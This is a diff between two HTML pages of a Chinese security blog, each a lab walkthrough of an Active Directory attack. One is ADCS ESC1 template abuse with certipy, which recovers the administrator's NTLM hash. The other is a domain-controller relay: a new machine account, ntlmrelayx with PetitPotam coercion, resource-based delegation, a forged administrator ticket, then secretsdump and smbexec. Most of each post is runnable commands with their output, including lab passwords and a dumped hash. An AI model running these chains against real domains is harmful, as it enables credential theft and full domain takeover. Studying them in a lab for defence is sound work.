@@ -16,34 +16,32 @@
   <meta name="author" content="Ustin1an">
   <meta name="keywords" content="">
   
-    <meta name="description" content="搭建环境点击证书颁发机构证书模版 - 复制 工作站身份验证使用者名称：在请求中提供扩展：应用程序策略配置客户端身份验证安全：增加 domain users 的注册权限颁布新模版 漏洞探测1certipy find -u kege@ust4.fun -p Cqk@123 -dc-ip 192.168.214.200 -vulnerable -debug  1certipy find -u kege@">
+    <meta name="description" content="查看主域: netdom query pdc查看所有的域控制器，包括主域控制器(PDC)和辅域控制器(ADC): nltest &#x2F;dclist:域名 测试环境主域控: 192.168.214.200辅域控: 192.168.214.201 创建机器账户1addcomputer.py -computer-name &quot;relay1&quot; -computer-pass &quot;Aa@">
 <meta property="og:type" content="article">
-<meta property="og:title" content="错误的 ADCS 模板配置-ESC1">
-<meta property="og:url" content="https://52hertz.tech/2024/01/10/ADCS-ESC1/index.html">
+<meta property="og:title" content="主辅域控 Relay">
+<meta property="og:url" content="https://52hertz.tech/2024/01/10/Relay/index.html">
 <meta property="og:site_name" content="42">
-<meta property="og:description" content="搭建环境点击证书颁发机构证书模版 - 复制 工作站身份验证使用者名称：在请求中提供扩展：应用程序策略配置客户端身份验证安全：增加 domain users 的注册权限颁布新模版 漏洞探测1certipy find -u kege@ust4.fun -p Cqk@123 -dc-ip 192.168.214.200 -vulnerable -debug  1certipy find -u kege@">
+<meta property="og:description" content="查看主域: netdom query pdc查看所有的域控制器，包括主域控制器(PDC)和辅域控制器(ADC): nltest &#x2F;dclist:域名 测试环境主域控: 192.168.214.200辅域控: 192.168.214.201 创建机器账户1addcomputer.py -computer-name &quot;relay1&quot; -computer-pass &quot;Aa@">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img.tucang.cc/api/image/show/d392205b6a4f05c13abee858ba6c86a5">
-<meta property="og:image" content="https://img.tucang.cc/api/image/show/411cc48cf7a2ab0b2cff7241abc41102">
-<meta property="og:image" content="https://img.tucang.cc/api/image/show/6dc8181740651073e2885fac42dfc70b">
-<meta property="og:image" content="https://img.tucang.cc/api/image/show/03077e0f3a23419b7c42583148b53f8f">
-<meta property="og:image" content="https://img.tucang.cc/api/image/show/c69a155394e5a20795c9125bae8dc30e">
-<meta property="og:image" content="https://img.tucang.cc/api/image/show/3a40f03e13f4d0613c7106cf5da03551">
-<meta property="og:image" content="https://img.tucang.cc/api/image/show/4f3d44fe08a47f9e3e66a03261c9d8ed">
-<meta property="og:image" content="https://img.tucang.cc/api/image/show/db7ad6e119173f53dbc11a715e80b38c">
-<meta property="og:image" content="https://img.tucang.cc/api/image/show/e00a42bf126d0aad9ebf70cabc47f6b5">
-<meta property="og:image" content="https://img.tucang.cc/api/image/show/cd887e90655b35d20441950db3f61556">
-<meta property="og:image" content="https://img.tucang.cc/api/image/show/af0312be62ee2e9632cd8d05ab107f8a">
-<meta property="article:published_time" content="2024-01-10T05:24:58.000Z">
-<meta property="article:modified_time" content="2024-01-11T02:41:59.830Z">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/a5a6d1c36fe90fcef70672af225fe43e">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/25ad5903b75fcb59ef512cd861afd81b">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/acd00111ddb095c0e23fccbf9e273fc9">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/88a82e9676ad3fca96f5a6e8ee5a16de">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/1302b1b26bcaf2cb951898f3b182bc80">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/a5187e542f3d1f7f1846d63c4d8e74cd">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/f65c645fe9317e380306686475e8c38e">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/f813c203c37b84cb873be3ff9ec62294">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/26de3677e6a5a5e3bb9d0f77356970a3">
+<meta property="article:published_time" content="2024-01-10T09:34:28.000Z">
+<meta property="article:modified_time" content="2024-01-11T07:39:28.519Z">
 <meta property="article:author" content="Ustin1an">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://img.tucang.cc/api/image/show/d392205b6a4f05c13abee858ba6c86a5">
+<meta name="twitter:image" content="https://img.tucang.cc/api/image/show/a5a6d1c36fe90fcef70672af225fe43e">
   
   
   
-  <title>错误的 ADCS 模板配置-ESC1 - 42</title>
+  <title>主辅域控 Relay - 42</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -209,7 +207,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="错误的 ADCS 模板配置-ESC1"></span>
+            <span id="subtitle" data-typed-text="主辅域控 Relay"></span>
           
         </div>
 
@@ -220,7 +218,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-01-10 13:24" pubdate>
+        <time datetime="2024-01-10 17:34" pubdate>
           2024年1月10日 下午
         </time>
       </span>
@@ -232,7 +230,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          704 字
+          992 字
         
       </span>
     
@@ -243,7 +241,7 @@
         
         
         
-          6 分钟
+          9 分钟
         
       </span>
     
@@ -280,23 +278,26 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">错误的 ADCS 模板配置-ESC1</h1>
+            <h1 id="seo-header">主辅域控 Relay</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>点击证书颁发机构<br><img src="https://img.tucang.cc/api/image/show/d392205b6a4f05c13abee858ba6c86a5" srcset="/img/loading.gif" lazyload alt="image.png"><br>证书模版 - 复制 工作站身份验证<br><img src="https://img.tucang.cc/api/image/show/411cc48cf7a2ab0b2cff7241abc41102" srcset="/img/loading.gif" lazyload alt="image.png"><br>使用者名称：在请求中提供<br><img src="https://img.tucang.cc/api/image/show/6dc8181740651073e2885fac42dfc70b" srcset="/img/loading.gif" lazyload alt="image.png"><br>扩展：应用程序策略配置客户端身份验证<br><img src="https://img.tucang.cc/api/image/show/03077e0f3a23419b7c42583148b53f8f" srcset="/img/loading.gif" lazyload alt="image.png"><br>安全：增加 <code>domain users</code> 的注册权限<br><img src="https://img.tucang.cc/api/image/show/c69a155394e5a20795c9125bae8dc30e" srcset="/img/loading.gif" lazyload alt="image.png"><br>颁布新模版<br><img src="https://img.tucang.cc/api/image/show/3a40f03e13f4d0613c7106cf5da03551" srcset="/img/loading.gif" lazyload alt="image.png"></p>
-<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy find -u kege@ust4.fun -p Cqk@123 -dc-ip 192.168.214.200 -vulnerable -debug<br></code></pre></td></tr></table></figure>
-<p><img src="https://img.tucang.cc/api/image/show/4f3d44fe08a47f9e3e66a03261c9d8ed" srcset="/img/loading.gif" lazyload alt="image.png"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy find -u kege@ust4.fun -p Cqk@123 -dc-ip 192.168.214.200 -vulnerable -stdout -scheme ldap<br></code></pre></td></tr></table></figure>
-<p><img src="https://img.tucang.cc/api/image/show/db7ad6e119173f53dbc11a715e80b38c" srcset="/img/loading.gif" lazyload alt="image.png"></p>
-<h2 id="针对-ESC1-请求证书"><a href="#针对-ESC1-请求证书" class="headerlink" title="针对 ESC1 请求证书"></a>针对 ESC1 请求证书</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy req -u kege@ust4.fun -p <span class="hljs-string">&#x27;Cqk@123&#x27;</span> -target 192.168.214.200 -ca UST4-DC01-CA -template esc1 -upn administrator@ust4.fun -debug<br></code></pre></td></tr></table></figure>
-<p><img src="https://img.tucang.cc/api/image/show/e00a42bf126d0aad9ebf70cabc47f6b5" srcset="/img/loading.gif" lazyload alt="image.png"></p>
-<h2 id="利用证书申请-HASH"><a href="#利用证书申请-HASH" class="headerlink" title="利用证书申请 HASH"></a>利用证书申请 HASH</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy auth -pfx administrator.pfx -dc-ip 192.168.214.200<br></code></pre></td></tr></table></figure>
-<p><img src="https://img.tucang.cc/api/image/show/cd887e90655b35d20441950db3f61556" srcset="/img/loading.gif" lazyload alt="image.png"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] Got <span class="hljs-built_in">hash</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;administrator@ust4.fun&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:214114172ade9bb8d8feca6d765e0cf9<br></code></pre></td></tr></table></figure>
-<h2 id="利用-HASH-进行横向"><a href="#利用-HASH-进行横向" class="headerlink" title="利用 HASH 进行横向"></a>利用 HASH 进行横向</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:214114172ade9bb8d8feca6d765e0cf9 ust4.fun/administrator@192.168.214.200<br></code></pre></td></tr></table></figure>
-<p><img src="https://img.tucang.cc/api/image/show/af0312be62ee2e9632cd8d05ab107f8a" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+                <p>查看主域: <code>netdom query pdc</code><br><img src="https://img.tucang.cc/api/image/show/a5a6d1c36fe90fcef70672af225fe43e" srcset="/img/loading.gif" lazyload alt="image.png"><br>查看所有的域控制器，包括主域控制器(PDC)和辅域控制器(ADC): <code>nltest /dclist:域名</code><br><img src="https://img.tucang.cc/api/image/show/25ad5903b75fcb59ef512cd861afd81b" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>主域控: 192.168.214.200<br>辅域控: 192.168.214.201</p>
+<h2 id="创建机器账户"><a href="#创建机器账户" class="headerlink" title="创建机器账户"></a><strong>创建机器账户</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">addcomputer.py -computer-name <span class="hljs-string">&quot;relay1&quot;</span> -computer-pass <span class="hljs-string">&quot;Aa@123&quot;</span> -dc-ip 192.168.214.200 <span class="hljs-string">&quot;ust4.fun/testacc:Cxk@123&quot;</span> -method SAMR -debug<br></code></pre></td></tr></table></figure>
+<p><img src="https://img.tucang.cc/api/image/show/acd00111ddb095c0e23fccbf9e273fc9" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] Successfully added machine account relay1$ with password Aa@123<br></code></pre></td></tr></table></figure>
+<h2 id="开启中继监听"><a href="#开启中继监听" class="headerlink" title="开启中继监听"></a>开启中继监听</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 ntlmrelayx.py --escalate-user relay1$ --delegate-access -smb2support --remove-mic -t ldap://192.168.214.201 -debug<br></code></pre></td></tr></table></figure>
+<p><img src="https://img.tucang.cc/api/image/show/88a82e9676ad3fca96f5a6e8ee5a16de" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 PetitPotam.py -d <span class="hljs-string">&#x27;&#x27;</span> -u <span class="hljs-string">&#x27;&#x27;</span> -p <span class="hljs-string">&#x27;&#x27;</span> 192.168.214.147 192.168.214.200<br></code></pre></td></tr></table></figure>
+<p><img src="https://img.tucang.cc/api/image/show/1302b1b26bcaf2cb951898f3b182bc80" srcset="/img/loading.gif" lazyload alt="image.png"><br>成功提升权限，赋予了relay1$ 对 DC01 的 RBCD<br><img src="https://img.tucang.cc/api/image/show/a5187e542f3d1f7f1846d63c4d8e74cd" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="申请票据"><a href="#申请票据" class="headerlink" title="申请票据"></a>申请票据</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python getST.py -spn cifs/DC01.ust4.fun ust4.fun/relay1$:Aa@123 -impersonate administrator -dc-ip 192.168.214.200<br></code></pre></td></tr></table></figure>
+<p><img src="https://img.tucang.cc/api/image/show/f65c645fe9317e380306686475e8c38e" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="导入票据获取权限"><a href="#导入票据获取权限" class="headerlink" title="导入票据获取权限"></a>导入票据获取权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> KRB5CCNAME=administrator.ccache <br>python secretsdump.py -target-ip 192.168.214.200 -dc-ip 192.168.214.200 -k -no-pass @<span class="hljs-string">&#x27;dc01.ust4.fun&#x27;</span> -just-dc-user administrator<br></code></pre></td></tr></table></figure>
+<p><img src="https://img.tucang.cc/api/image/show/f813c203c37b84cb873be3ff9ec62294" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> KRB5CCNAME=administrator.ccache <br>python smbexec.py -target-ip 192.168.214.200 -dc-ip 192.168.214.200 -k -no-pass @<span class="hljs-string">&#x27;dc01.ust4.fun&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img.tucang.cc/api/image/show/26de3677e6a5a5e3bb9d0f77356970a3" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 
                 
               </div>
@@ -342,8 +343,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>错误的 ADCS 模板配置-ESC1</div>
-      <div>https://52hertz.tech/2024/01/10/ADCS-ESC1/</div>
+      <div>主辅域控 Relay</div>
+      <div>https://52hertz.tech/2024/01/10/Relay/</div>
     </div>
     <div class="license-meta">
       
@@ -387,18 +388,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/01/10/Relay/" title="主辅域控 Relay">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">主辅域控 Relay</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/01/09/CVE-2022-26923/" title="CVE-2022-26923 ADCS提权">
-                        <span class="hidden-mobile">CVE-2022-26923 ADCS提权</span>
+                      <a href="/2024/01/10/ADCS-ESC1/" title="错误的 ADCS 模板配置-ESC1">
+                        <span class="hidden-mobile">错误的 ADCS 模板配置-ESC1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -418,8 +413,8 @@
     
       <script type="text/javascript">
         var disqus_config = function() {
-          this.page.url = 'https://52hertz.tech/2024/01/10/ADCS-ESC1/';
-          this.page.identifier = '/2024/01/10/ADCS-ESC1/';
+          this.page.url = 'https://52hertz.tech/2024/01/10/Relay/';
+          this.page.identifier = '/2024/01/10/Relay/';
         };
         Fluid.utils.loadComments('#disqus_thread', function() {
           var d = document, s = d.createElement('script');
